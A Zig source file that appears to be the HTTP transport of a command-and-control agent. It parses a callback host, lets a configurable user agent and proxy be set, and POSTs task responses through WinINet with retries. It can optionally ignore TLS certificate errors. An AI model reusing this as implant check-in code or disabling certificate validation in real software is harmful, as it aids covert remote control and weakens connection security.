const std = @import("std");
const win = @import("win32.zig");
const config = @import("config.zig");

pub const NxEndpoint = struct {
    host: []const u8,
    port: u16,
    ssl: bool,
    uri: []const u8,
    user_agent: []const u8,
    proxy_host: []const u8,
    proxy_port: u16,
    tls_verify: bool,
};

pub fn nx_endpoint_from_config(allocator: std.mem.Allocator, cfg: config.NxConfig) !NxEndpoint {
    var raw = cfg.callback_host;
    var ssl = false;
    if (std.mem.startsWith(u8, raw, "https://")) {
        ssl = true;
        raw = raw[8..];
    } else if (std.mem.startsWith(u8, raw, "http://")) {
        raw = raw[7..];
    }
    if (std.mem.indexOfScalar(u8, raw, '/')) |slash| {
        raw = raw[0..slash];
    }
    var host = raw;
    var port = cfg.callback_port;
    if (std.mem.lastIndexOfScalar(u8, host, ':')) |colon| {
        const port_text = host[colon + 1 ..];
        const parsed = std.fmt.parseInt(u16, port_text, 10) catch 0;
        if (parsed != 0) {
            port = parsed;
            host = host[0..colon];
        }
    }
    const uri = if (cfg.post_uri.len == 0 or cfg.post_uri[0] != '/')
        try std.fmt.allocPrint(allocator, "/{s}", .{cfg.post_uri})
    else
        cfg.post_uri;

    return .{
        .host = host,
        .port = port,
        .ssl = ssl,
        .uri = uri,
        .user_agent = cfg.user_agent,
        .proxy_host = cfg.proxy_host,
        .proxy_port = cfg.proxy_port,
        .tls_verify = cfg.tls_verify,
    };
}

fn nx_post_once(
    allocator: std.mem.Allocator,
    endpoint: NxEndpoint,
    body: []const u8,
) ![]u8 {
    const agent = try std.unicode.utf8ToUtf16LeAllocZ(allocator, endpoint.user_agent);
    const host = try std.unicode.utf8ToUtf16LeAllocZ(allocator, endpoint.host);
    const uri = try std.unicode.utf8ToUtf16LeAllocZ(allocator, endpoint.uri);
    const headers = try std.unicode.utf8ToUtf16LeAllocZ(
        allocator,
        "Content-Type: application/octet-stream\r\nConnection: close\r\n",
    );

    var proxy_wide: ?[:0]u16 = null;
    var access_type: win.DWORD = win.INTERNET_OPEN_TYPE_PRECONFIG;
    if (endpoint.proxy_host.len > 0) {
        const proxy = if (endpoint.proxy_port > 0)
            try std.fmt.allocPrint(allocator, "{s}:{d}", .{ endpoint.proxy_host, endpoint.proxy_port })
        else
            endpoint.proxy_host;
        proxy_wide = try std.unicode.utf8ToUtf16LeAllocZ(allocator, proxy);
        access_type = win.INTERNET_OPEN_TYPE_PROXY;
    }

    const internet = win.InternetOpenW(
        agent.ptr,
        access_type,
        if (proxy_wide) |p| p.ptr else null,
        null,
        0,
    ) orelse return error.InternetOpenFailed;
    defer _ = win.InternetCloseHandle(internet);

    var timeout: win.DWORD = 30_000;
    _ = win.InternetSetOptionW(internet, win.INTERNET_OPTION_CONNECT_TIMEOUT, @ptrCast(&timeout), @sizeOf(win.DWORD));
    _ = win.InternetSetOptionW(internet, win.INTERNET_OPTION_SEND_TIMEOUT, @ptrCast(&timeout), @sizeOf(win.DWORD));
    _ = win.InternetSetOptionW(internet, win.INTERNET_OPTION_RECEIVE_TIMEOUT, @ptrCast(&timeout), @sizeOf(win.DWORD));

    const connect = win.InternetConnectW(
        internet,
        host.ptr,
        endpoint.port,
        null,
        null,
        win.INTERNET_SERVICE_HTTP,
        0,
        0,
    ) orelse return error.InternetConnectFailed;
    defer _ = win.InternetCloseHandle(connect);

    var flags: win.DWORD = win.INTERNET_FLAG_RELOAD |
        win.INTERNET_FLAG_NO_CACHE_WRITE |
        win.INTERNET_FLAG_NO_UI;
    if (endpoint.ssl) {
        flags |= win.INTERNET_FLAG_SECURE;
        if (!endpoint.tls_verify) {
            flags |= win.INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                win.INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
        }
    }

    const request = win.HttpOpenRequestW(
        connect,
        std.unicode.utf8ToUtf16LeStringLiteral("POST").ptr,
        uri.ptr,
        null,
        null,
        null,
        flags,
        0,
    ) orelse return error.HttpOpenRequestFailed;
    defer _ = win.InternetCloseHandle(request);

    if (endpoint.ssl and !endpoint.tls_verify) {
        var sec_flags: win.DWORD = win.SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            win.SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            win.SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            win.SECURITY_FLAG_IGNORE_WRONG_USAGE;
        _ = win.InternetSetOptionW(
            request,
            win.INTERNET_OPTION_SECURITY_FLAGS,
            @ptrCast(&sec_flags),
            @sizeOf(win.DWORD),
        );
    }

    const body_ptr: ?*const anyopaque = if (body.len > 0) @ptrCast(body.ptr) else null;
    if (!win.HttpSendRequestW(
        request,
        headers.ptr,
        -1,
        body_ptr,
        @intCast(body.len),
    ).toBool()) {
        return error.HttpSendFailed;
    }

    var status: win.DWORD = 0;
    var status_len: win.DWORD = @sizeOf(win.DWORD);
    if (!win.HttpQueryInfoW(
        request,
        win.HTTP_QUERY_STATUS_CODE | win.HTTP_QUERY_FLAG_NUMBER,
        @ptrCast(&status),
        &status_len,
        null,
    ).toBool()) {
        return error.HttpStatusQueryFailed;
    }
    if (status != 200) return error.HttpStatusNotOk;

    var response: std.ArrayList(u8) = .empty;
    defer response.deinit(allocator);
    var buffer: [4096]u8 = undefined;
    while (true) {
        var read: win.DWORD = 0;
        if (!win.InternetReadFile(request, &buffer, buffer.len, &read).toBool()) {
            return error.HttpReadFailed;
        }
        if (read == 0) break;
        try response.appendSlice(allocator, buffer[0..read]);
    }
    return response.toOwnedSlice(allocator);
}

/// Post with the same small retry/backoff used by the C++ agent. WinINet can
/// fail the first request on a stale pooled connection; fresh sessions and a
/// short backoff avoid losing task responses.
pub fn nx_post(
    allocator: std.mem.Allocator,
    endpoint: NxEndpoint,
    body: []const u8,
) ![]u8 {
    var attempt: usize = 0;
    while (attempt < 3) : (attempt += 1) {
        if (attempt == 1) win.Sleep(500);
        if (attempt == 2) win.Sleep(1500);
        return nx_post_once(allocator, endpoint, body) catch |err| {
            if (attempt == 2) return err;
            continue;
        };
    }
    unreachable;
}
